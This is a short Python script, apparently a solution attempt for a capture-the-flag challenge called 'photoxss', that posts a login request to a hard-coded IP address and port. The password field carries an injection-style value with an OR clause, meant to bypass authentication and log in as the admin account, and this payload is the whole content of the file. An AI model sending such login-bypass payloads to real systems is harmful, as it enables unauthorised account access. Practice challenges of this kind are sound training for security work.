import requests 

url = "http://3.36.132.18:10002"

ID = ""
# ID = "photoxss_admin"
PW = "photoxss!@@ OR id=PHOTOXSS_ADMIN;" 

s = requests.session() 

r = s.post( 
    f"{url}/login", 
    data={
        "id": ID,
        "pw": PW
    }
)
print(r.text)